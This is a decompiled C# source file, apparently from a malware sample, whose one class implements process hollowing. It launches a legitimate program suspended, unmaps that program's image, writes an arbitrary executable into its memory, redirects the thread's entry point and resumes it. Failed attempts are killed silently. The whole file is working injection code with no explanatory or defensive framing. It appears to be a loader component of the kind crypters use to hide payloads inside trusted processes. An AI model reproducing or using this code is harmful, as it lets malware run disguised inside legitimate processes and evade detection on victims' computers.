using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;

namespace pw
{
	// Token: 0x02000007 RID: 7
	internal sealed class Class1
	{
		// Token: 0x06000012 RID: 18
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
		private static extern bool CreateProcess(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_0, IntPtr intptr_2, string string_2, ref Class1.Struct1 struct1_0, ref Class1.Struct0 struct0_0);

		// Token: 0x06000013 RID: 19
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern bool GetThreadContext(IntPtr intptr_0, int[] int_0);

		// Token: 0x06000014 RID: 20
		[SuppressUnmanagedCodeSecurity]
		[DllImport("ntdll.dll")]
		private static extern int NtUnmapViewOfSection(IntPtr intptr_0, int int_0);

		// Token: 0x06000015 RID: 21
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern bool ReadProcessMemory(IntPtr intptr_0, int int_0, ref int int_1, int int_2, ref int int_3);

		// Token: 0x06000016 RID: 22
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern int ResumeThread(IntPtr intptr_0);

		// Token: 0x06000017 RID: 23
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern bool SetThreadContext(IntPtr intptr_0, int[] int_0);

		// Token: 0x06000018 RID: 24 RVA: 0x00038928 File Offset: 0x00036D28
		public static bool smethod_0(string string_0, string string_1, byte[] byte_0, bool bool_0, bool bool_1)
		{
			string text = string.Format("\"{0}\"", string_0);
			Class1.Struct1 @struct = default(Class1.Struct1);
			Class1.Struct0 struct2 = default(Class1.Struct0);
			checked
			{
				@struct.int_0 = (int)((uint)Marshal.SizeOf(typeof(Class1.Struct1)));
				if (bool_1)
				{
					@struct.int_8 = 1;
				}
				try
				{
					if (!string.IsNullOrEmpty(string_1))
					{
						text = text + " " + string_1;
					}
					if (!Class1.CreateProcess(string_0, text, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref @struct, ref struct2))
					{
						throw new Exception();
					}
					int num = BitConverter.ToInt32(byte_0, 60);
					int num2 = BitConverter.ToInt32(byte_0, num + 52);
					int[] array = new int[179];
					array[0] = 65538;
					if (IntPtr.Size == 4)
					{
						if (!Class1.GetThreadContext(struct2.intptr_1, array))
						{
							throw new Exception();
						}
					}
					else if (!Class1.Wow64GetThreadContext(struct2.intptr_1, array))
					{
						throw new Exception();
					}
					int num3 = array[41];
					int num4 = 0;
					int num5 = 0;
					if (!Class1.ReadProcessMemory(struct2.intptr_0, num3 + 8, ref num4, 4, ref num5))
					{
						throw new Exception();
					}
					if (num2 == num4 && Class1.NtUnmapViewOfSection(struct2.intptr_0, num4) != 0)
					{
						throw new Exception();
					}
					int num6 = BitConverter.ToInt32(byte_0, num + 80);
					int num7 = BitConverter.ToInt32(byte_0, num + 84);
					int num8 = Class1.VirtualAllocEx(struct2.intptr_0, num2, num6, 12288, 64);
					bool flag = false;
					if (!bool_0 && num8 == 0)
					{
						flag = true;
						num8 = Class1.VirtualAllocEx(struct2.intptr_0, 0, num6, 12288, 64);
					}
					if (num8 == 0)
					{
						throw new Exception();
					}
					if (!Class1.WriteProcessMemory(struct2.intptr_0, num8, byte_0, num7, ref num5))
					{
						throw new Exception();
					}
					int num9 = num + 248;
					short num10 = BitConverter.ToInt16(byte_0, num + 6);
					int num11 = (int)(num10 - 1);
					for (int i = 0; i <= num11; i++)
					{
						int num12 = BitConverter.ToInt32(byte_0, num9 + 12);
						int num13 = BitConverter.ToInt32(byte_0, num9 + 16);
						int num14 = BitConverter.ToInt32(byte_0, num9 + 20);
						if (num13 != 0)
						{
							byte[] array2 = new byte[num13 - 1 + 1 - 1 + 1];
							Buffer.BlockCopy(byte_0, num14, array2, 0, array2.Length);
							if (!Class1.WriteProcessMemory(struct2.intptr_0, num8 + num12, array2, array2.Length, ref num5))
							{
								throw new Exception();
							}
						}
						num9 += 40;
					}
					byte[] bytes = BitConverter.GetBytes(num8);
					if (!Class1.WriteProcessMemory(struct2.intptr_0, num3 + 8, bytes, 4, ref num5))
					{
						throw new Exception();
					}
					int num15 = BitConverter.ToInt32(byte_0, num + 40);
					if (flag)
					{
						num8 = num2;
					}
					array[44] = num8 + num15;
					if (IntPtr.Size == 4)
					{
						if (!Class1.SetThreadContext(struct2.intptr_1, array))
						{
							throw new Exception();
						}
					}
					else if (!Class1.Wow64SetThreadContext(struct2.intptr_1, array))
					{
						throw new Exception();
					}
					if (Class1.ResumeThread(struct2.intptr_1) == -1)
					{
						throw new Exception();
					}
				}
				catch (Exception ex)
				{
					try
					{
						Process processById = Process.GetProcessById((int)struct2.uint_0);
						if (processById != null)
						{
							processById.Kill();
						}
					}
					catch (Exception ex2)
					{
					}
					return false;
				}
				return true;
			}
		}

		// Token: 0x06000019 RID: 25
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern int VirtualAllocEx(IntPtr intptr_0, int int_0, int int_1, int int_2, int int_3);

		// Token: 0x0600001A RID: 26
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern bool Wow64GetThreadContext(IntPtr intptr_0, int[] int_0);

		// Token: 0x0600001B RID: 27
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern bool Wow64SetThreadContext(IntPtr intptr_0, int[] int_0);

		// Token: 0x0600001C RID: 28
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll")]
		private static extern bool WriteProcessMemory(IntPtr intptr_0, int int_0, byte[] byte_0, int int_1, ref int int_2);

		// Token: 0x02000008 RID: 8
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct Struct0
		{
			// Token: 0x04000006 RID: 6
			public IntPtr intptr_0;

			// Token: 0x04000007 RID: 7
			public IntPtr intptr_1;

			// Token: 0x04000008 RID: 8
			public uint uint_0;

			// Token: 0x04000009 RID: 9
			public uint uint_1;
		}

		// Token: 0x02000009 RID: 9
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct Struct1
		{
			// Token: 0x0400000A RID: 10
			public int int_0;

			// Token: 0x0400000B RID: 11
			public string string_0;

			// Token: 0x0400000C RID: 12
			public string string_1;

			// Token: 0x0400000D RID: 13
			public string string_2;

			// Token: 0x0400000E RID: 14
			public int int_1;

			// Token: 0x0400000F RID: 15
			public int int_2;

			// Token: 0x04000010 RID: 16
			public int int_3;

			// Token: 0x04000011 RID: 17
			public int int_4;

			// Token: 0x04000012 RID: 18
			public int int_5;

			// Token: 0x04000013 RID: 19
			public int int_6;

			// Token: 0x04000014 RID: 20
			public int int_7;

			// Token: 0x04000015 RID: 21
			public int int_8;

			// Token: 0x04000016 RID: 22
			public short short_0;

			// Token: 0x04000017 RID: 23
			public short short_1;

			// Token: 0x04000018 RID: 24
			public int int_9;

			// Token: 0x04000019 RID: 25
			public int int_10;

			// Token: 0x0400001A RID: 26
			public int int_11;

			// Token: 0x0400001B RID: 27
			public int int_12;
		}
	}
}
